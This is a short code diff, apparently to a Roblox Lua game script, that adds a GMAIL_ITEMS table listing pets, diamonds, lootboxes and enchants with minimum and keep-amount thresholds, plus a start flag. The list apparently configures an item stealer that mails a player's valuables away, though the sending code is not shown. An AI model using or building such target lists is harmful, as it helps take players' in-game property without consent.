@@ -6,7 +6,29 @@ task.spawn(function()
 
 
 
+getgenv().GMAIL_ITEMS = {	
 
+["Secret pet1"] = {Class = "Pet", Id = "Rainbow Swirl", MinAmount = 1, AllVariants = true},
+["Secret pet2"] = {Class = "Pet", Id = "Banana", MinAmount = 1, AllVariants = true},
+["Secret pet3"] = {Class = "Pet", Id = "Coin", MinAmount = 1, AllVariants = true},
+["Secret pet4"] = {Class = "Pet", Id = "Yellow Lucky Block", MinAmount = 1, AllVariants = true},	
+
+["Send Diamonds"] = {Class = "Currency", Id = "Diamonds", KeepAmount = "55m", MinAmount = "600m"},
+["Deep Sea Treasure Chest"] = {Class = "Lootbox", Id= "Deep Sea Treasure Chest", MinAmount = 5},
+["Hype Egg 2"] = {Class = "Lootbox", Id= "Hype Egg 2", MinAmount = 1},
+["Lucky Eggs"] = {Class = "Enchant", Tier = 9 ,Id = "Lucky Eggs", MinAmount = 2, KeepAmount = 1},
+
+["Chest Breaker"] = {Class = "Enchant", Tier = 1 ,Id = "Corruption", MinAmount = 2, KeepAmount = 1},
+["Corruption"] = {Class = "Enchant", Tier = 1 ,Id = "Corruption", MinAmount = 1},
+["Mega Chest Breaker"] = {Class = "Enchant", Tier = 1 ,Id = "Mega Chest Breaker", MinAmount = 1},
+
+--["LuckyPotion"] = {Class = "Potion", Tier = 9 ,Id = "Lucky", MinAmount = 1000, KeepAmount = 500},
+--["Diamonds"] = {Class = "Potion", Tier = 9 ,Id = "Diamonds", MinAmount = 1000, KeepAmount = 500},
+
+["Lucki Golem"] = {Class = "Pet" ,Id = "Lucki Golem", IsRainbow = true , MinAmount = 1},	
+["Lucki Chest Mimic"] = {Class = "Pet", Id = "Lucki Chest Mimic", IsRainbow = true,  MinAmount = 2, KeepAmount = 1},	
+
+}
 
 ------------------------+++
 _G.start_vvv_ = true
